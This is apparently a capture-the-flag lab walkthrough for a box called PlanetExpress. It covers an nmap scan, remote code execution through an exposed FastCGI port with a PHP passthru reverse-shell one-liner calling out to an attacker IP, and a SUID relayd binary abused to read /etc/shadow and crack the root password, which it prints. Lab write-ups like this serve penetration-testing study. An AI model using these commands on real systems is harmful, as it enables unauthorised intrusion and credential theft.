---
icon: ubuntu
---

# PlanetExpress - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.209.205 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 12:40 EDT
Nmap scan report for 192.168.209.205
Host is up (0.029s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-title: PlanetExpress - Coming Soon !
|_http-generator: Pico CMS
|_http-server-header: Apache/2.4.38 (Debian)
9000/tcp open  cslistener?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|3.X|2.6.X (97%), MikroTik RouterOS 7.X (94%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (94%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 2.6.32 - 3.13 (90%), Linux 3.4 - 3.10 (90%), Linux 4.19 - 5.15 (89%), Linux 4.15 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   30.59 ms 192.168.45.1
2   30.28 ms 192.168.45.254
3   30.78 ms 192.168.251.1
4   30.98 ms 192.168.209.205
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Nmap mentioned something about PicoCMS I am going to checkout their [**repository**](https://github.com/picocms/Pico)

<figure><img src="../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

there is a config.yml file let's check it out

<figure><img src="../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

There is a custom developed plugin for this site. Thanks to the repo we know its going to be stored under `/plugins`

<figure><img src="../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

This is just hosting phpinfo, let's checkout the document root and the disabled functions

<figure><img src="../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

Ok I am going to keep all of this in mind, we might need all of this for chain exploitation. Ill check out port 9000 now

### <mark style="color:$primary;">HTTP Port 9000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

Hacktricks has more details on FastCGI here is a [**link**](https://hacktricks.xsx.tw/network-services-pentesting/9000-pentesting-fastcgi) they also provide us with an exploit [**here**](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)

### <mark style="color:$primary;">FastCGI RCE</mark>

Ok now that we have an exploit, we take a look at the functions that are not disabled. I'll use `passthru` to achieve RCE

{% code overflow="wrap" %}
```bash
python2 attack.py -c '<?php passthru("bash -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.158 80 > /tmp/f\""); ?>' 192.168.209.205 /var/www/html/planetexpress/plugins/PicoTest.php
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

linpeas revealed an unknown SUID let's check it out

<figure><img src="../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

There is a read flag `-C` . We might be able to read /etc/shadow or root's ssh key!

<figure><img src="../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

there is no ssh key in roots directory

```
/usr/sbin/relayd -C /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

This make the file readable by everyone

<figure><img src="../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

I'll copy root's hash unshadow it and try to crack it

<figure><img src="../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

I'll save this as root\_hash and try to crack it with john

<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

```
neverwant2saygoodbye
```

Now we can ssh as root

<figure><img src="../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>
